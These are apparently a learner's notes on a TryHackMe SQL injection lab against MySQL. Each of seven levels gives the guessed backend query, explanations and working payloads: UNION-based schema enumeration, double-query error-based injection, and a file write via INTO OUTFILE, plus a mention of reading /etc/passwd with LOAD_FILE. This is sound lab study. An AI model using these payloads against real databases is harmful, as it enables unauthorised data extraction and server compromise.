# SQLi Lab (tryhackme)
## Database Server -> MySQL

# LEVEL 1 (GET - Error based - Single quotes - String)
Potential backend query
```
SELECT * FROM <users> WHERE id = '$id' LIMIT 0,1
```

Notes
```
"String injection" first is checked by using (') or (") closing the string for where syntax

If error message pop out, it will give us some more information for us to use, like a guide. Something like SQL syntax error, or SELECT statements have different number of columns
```

Injection
```
' UNION SELECT 1, 2, 3-- -

' UNION SELECT 1, schema_name, 3 FROM information_schema.schemata LIMIT <offset>,1-- -
```
---

# Level 2 (GET - Error based - Integer based)
Potential backend query
```
SELECT * FROM <users> WHERE id=$id LIMIT 0,1
```

Notes
```
"Integer injection" means there is no string quotes for the input

We can just append what we want behind it

Why use 0 as the id value? because we don't want the first SELECT syntax give out an output so that our SELECT syntax give out output instead
```

Injection
```
0 UNION SELECT 1,2,3

0 UNION SELECT 1, schema_name,3 FROM information_schema.schemata LIMIT <offset>,1-- -
```
---

# LEVEL 3 (GET - Error based - Single quotes with a twist - String)
Potential backend query
```
SELECT * FROM <users> WHERE id=('$id') LIMIT 0,1
```

Notes
```
Checking id=1' like basic "string injection" give us SQL syntax error which stated

**You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1**
```

Injection
```
') UNION SELECT 1, 2, 3-- -

') UNION SELECT 1, schema_name, 3 FROM information_schema.schemata LIMIT 1,1-- -
```
---

# LEVEL 4 (GET - Error based - Double Quotes - String)
Potential backend query
```
SELECT * FROM <users> WHERE id=("$id") LIMIT 0,1
```

Notes
```
As I said before, we could check SQLi by using (') or ("), now we just use the latter
```

Injection
```
") UNION SELECT 1, 2, 3 -- -

") UNION SELECT 1, schema_name, 3 FROM information_schema.schemata LIMIT 1,1-- -
```
---

# LEVEL 5 (GET - Double injection - Single quotes - String)
Potential backend query
```
$statement = "SELECT * FROM <users> WHERE id='$id' LIMIT 0,1";
$result = $connection->query($statement);
if($result->num_rows != 0){
	echo "You are in...........";
}
else{
	print_r($conn->error);
}
```

Notes
```
Useless output when it return true, else error... somehow we need to get what we want by the error

COUNT(*) -> count up all the column from GROUP BY tmp table

FLOOR() -> round down
RAND() -> get random number between 0,1

Subquery -> select inside select

This injection happen because of duplicate value of the tmp table from the GROUP BY syntax, because we randomize the value selected in the group by, it might get confused and give out duplicate value error
```

|COUNT(\*)|a|
|:---:|:---:|
|6|0|
|9|1|
|?(Error)|1(Duplicate)|


Injection
```
1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT schema_name FROM information_schema.schemata LIMIT <offset>,1),'+', FLOOR(RAND()*2))a FROM <TABLE> GROUP BY a)b)-- -
```

Reference : [Double Query Injection by Sudharshan Kumar](https://medium.com/cybersecurityservices/sql-injection-double-query-injection-sudharshan-kumar-8222baad1a9c)
---

# LEVEL 6 (GET - Double injection - Double quotes - String)
Potential backend query
```
$statement = 'SELECT * FROM <users> WHERE id="$id" LIMIT 0,1';
$result = $connection->query($statement);
if($result->num_rows != 0){
	echo "You are in...........";
}
else{
	print_r($conn->error);
}
```

Notes
```
Same principal as before, just change the quote (') to double quote (")
```

Injection
```
1" AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT schema_name FROM information_schema.schemata LIMIT <offset>,1),"+", FLOOR(RAND()*2))a FROM <TABLE> GROUP BY a)b)-- -
```
---

# LEVEL 7
Potential backend query
```
SELECT * FROM <users> WHERE id=(('$id')) LIMIT 0,1
```

Notes
```
INTO OUTFILE is a mysql syntax to save an output into a file, after saving it into a file we could possibly open it from the webserver just by 'looking for it'
```

Injection
```
1')) UNION SELECT 1,2,3 INTO OUTFILE ('/var/ww/html/sqli-labs/Less-7/test.txt')-- -

^
this should work :<
you can even LOAD_FILE('/etc/passwd'), but somehow in this room we can't ._.

```
